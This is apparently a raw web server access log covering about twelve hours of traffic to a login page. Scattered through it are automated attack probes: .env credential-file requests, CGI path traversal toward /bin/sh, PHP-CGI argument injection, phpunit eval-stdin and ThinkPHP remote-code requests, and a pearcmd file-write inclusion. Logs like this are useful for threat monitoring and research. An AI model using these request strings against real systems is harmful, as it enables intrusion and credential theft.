138.197.213.92 - - [13/Oct/2024:13:23:48 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.213.92 - - [13/Oct/2024:13:23:48 +0000] "GET /1.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.213.92 - - [13/Oct/2024:13:23:48 +0000] "GET /systembc/password.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
138.197.213.92 - - [13/Oct/2024:13:23:48 +0000] "GET /password.php HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
149.50.103.48 - - [13/Oct/2024:13:45:16 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
80.82.77.202 - - [13/Oct/2024:14:39:24 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
205.169.39.38 - - [13/Oct/2024:14:43:33 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
34.79.213.51 - - [13/Oct/2024:14:51:26 +0000] "GET / HTTP/1.1" 200 1401 "-" "python-requests/2.32.3"
91.90.42.154 - - [13/Oct/2024:15:03:12 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:15:03:13 +0000] "GET /f8Np HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)"
91.90.42.154 - - [13/Oct/2024:15:03:13 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)"
91.90.42.154 - - [13/Oct/2024:15:03:13 +0000] "GET /iaJI HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)"
135.125.246.110 - - [13/Oct/2024:15:21:17 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:15:21:18 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [13/Oct/2024:15:52:48 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [13/Oct/2024:15:52:48 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.211.139.188 - - [13/Oct/2024:16:07:39 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.88.187.116 - - [13/Oct/2024:16:11:49 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:49 +0000] "GET /css/login.css HTTP/1.1" 200 620 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:50 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:50 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:50 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 2461 "http://54.224.97.58/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:50 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 374 "http://54.224.97.58/js/brand.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:50 +0000] "GET /config/brand.json HTTP/1.1" 200 77 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.88.187.116 - - [13/Oct/2024:16:11:50 +0000] "GET /brands/Hikvision.png HTTP/1.1" 200 328589 "http://54.224.97.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
35.90.60.191 - - [13/Oct/2024:16:11:54 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "curl/7.58.0"
35.90.60.191 - - [13/Oct/2024:16:11:54 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "curl/7.58.0"
35.90.60.191 - - [13/Oct/2024:16:11:54 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "curl/7.58.0"
35.90.60.191 - - [13/Oct/2024:16:11:55 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "curl/7.58.0"
93.123.85.155 - - [13/Oct/2024:16:28:35 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [13/Oct/2024:16:28:41 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:16:32:22 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:16:32:22 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.174.93.12 - - [13/Oct/2024:16:41:29 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
185.224.128.47 - - [13/Oct/2024:16:41:36 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
52.76.71.100 - - [13/Oct/2024:18:14:40 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Go-http-client/1.1"
52.76.71.100 - - [13/Oct/2024:18:14:41 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58:80/favicon.ico" "Go-http-client/1.1"
92.223.73.36 - - [13/Oct/2024:18:23:13 +0000] "GET /RVbR HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
92.38.180.27 - - [13/Oct/2024:18:23:14 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
95.214.55.43 - - [13/Oct/2024:18:52:28 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
135.125.246.110 - - [13/Oct/2024:19:06:28 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:19:06:28 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.90.42.154 - - [13/Oct/2024:19:16:18 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [13/Oct/2024:19:16:18 +0000] "GET /6oVa HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch)"
91.90.42.154 - - [13/Oct/2024:19:16:18 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch)"
91.90.42.154 - - [13/Oct/2024:19:16:19 +0000] "GET /s3Er HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Touch)"
49.0.33.202 - - [13/Oct/2024:19:38:11 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:12 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 226 "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:12 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:13 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:13 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:14 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:14 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:14 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:15 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:15 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:18 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:19 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:19 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:19 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:20 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:21 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:21 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:22 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:22 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:23 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:23 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:23 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:24 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:25 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:25 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:25 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:26 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:26 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:28 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:29 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:30 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:30 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:31 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:31 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:32 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:32 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:33 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:33 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:34 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:34 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:35 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:36 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:36 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:37 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
49.0.33.202 - - [13/Oct/2024:19:38:38 +0000] "GET /containers/json HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
135.125.246.110 - - [13/Oct/2024:19:54:42 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:19:54:42 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
60.191.125.35 - - [13/Oct/2024:20:15:53 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
16.171.153.170 - - [13/Oct/2024:20:51:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Whale/3.26.244.21 Safari/537.36"
123.231.205.196 - - [13/Oct/2024:20:52:12 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
51.254.59.113 - - [13/Oct/2024:21:35:54 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
43.134.141.244 - - [13/Oct/2024:21:36:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
34.206.72.158 - - [13/Oct/2024:21:40:11 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36"
34.206.72.158 - - [13/Oct/2024:21:41:01 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3"
34.206.72.158 - - [13/Oct/2024:21:41:01 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Linux; Android 9; SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
34.206.72.158 - - [13/Oct/2024:21:41:01 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.83"
135.125.246.110 - - [13/Oct/2024:22:34:40 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:22:34:40 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.193.57.62 - - [13/Oct/2024:22:40:13 +0000] "GET / HTTP/1.1" 200 1401 "-" "curl/7.29.0"
118.193.57.62 - - [13/Oct/2024:22:40:14 +0000] "\x16\x03\x01" 400 226 "-" "-"
118.193.57.62 - - [13/Oct/2024:22:40:14 +0000] "t3 12.1.2\n" 400 226 "-" "-"
178.211.139.188 - - [13/Oct/2024:22:48:18 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
135.125.246.110 - - [13/Oct/2024:23:08:15 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [13/Oct/2024:23:08:15 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.206.72.158 - - [13/Oct/2024:23:14:26 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Linux; Android 8.0.0; d-02K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Safari/537.36"
34.206.72.158 - - [13/Oct/2024:23:14:37 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3"
34.206.72.158 - - [13/Oct/2024:23:14:37 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
34.206.72.158 - - [13/Oct/2024:23:14:37 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0"
217.212.244.67 - - [13/Oct/2024:23:21:29 +0000] "GET /Z6ci HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36"
143.244.63.95 - - [13/Oct/2024:23:21:31 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
103.149.28.153 - - [13/Oct/2024:23:33:14 +0000] "CONNECT www.google.com:443 HTTP/1.1" 302 - "-" "Go-http-client/1.1"
34.206.72.158 - - [13/Oct/2024:23:56:32 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (X11; FreeBSD amd64; rv:54.0) Gecko/20100101 Firefox/54.0"
34.206.72.158 - - [13/Oct/2024:23:56:32 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
34.206.72.158 - - [13/Oct/2024:23:56:32 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36"
217.148.140.139 - - [14/Oct/2024:00:08:07 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0"
217.148.140.139 - - [14/Oct/2024:00:08:11 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0"
91.90.42.154 - - [14/Oct/2024:00:14:00 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [14/Oct/2024:00:14:00 +0000] "GET /SRqF HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0"
91.90.42.154 - - [14/Oct/2024:00:14:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0"
91.90.42.154 - - [14/Oct/2024:00:14:01 +0000] "GET /ROXd HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0"
40.67.138.47 - - [14/Oct/2024:00:33:18 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
40.67.138.47 - - [14/Oct/2024:00:33:18 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [14/Oct/2024:00:43:11 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [14/Oct/2024:00:43:11 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
77.90.7.19 - - [14/Oct/2024:01:00:47 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla 5/0"
77.90.7.19 - - [14/Oct/2024:01:00:47 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla 5/0"
77.90.7.19 - - [14/Oct/2024:01:00:47 +0000] "GET /vendor/phpunit/phpunit/phpunit.xml HTTP/1.1" 302 - "-" "Mozilla 5/0"
77.90.7.19 - - [14/Oct/2024:01:00:47 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla 5/0"
93.174.93.12 - - [14/Oct/2024:01:01:40 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"
198.235.24.199 - - [14/Oct/2024:01:05:00 +0000] "\x16\x03\x01" 400 226 "-" "-"
198.235.24.199 - - [14/Oct/2024:01:05:00 +0000] "\x16\x03\x01" 400 226 "-" "-"
135.125.217.54 - - [14/Oct/2024:01:12:15 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [14/Oct/2024:01:12:15 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.203.210.158 - - [14/Oct/2024:01:23:17 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.224.128.83 - - [14/Oct/2024:01:28:18 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 196 "-" "-"
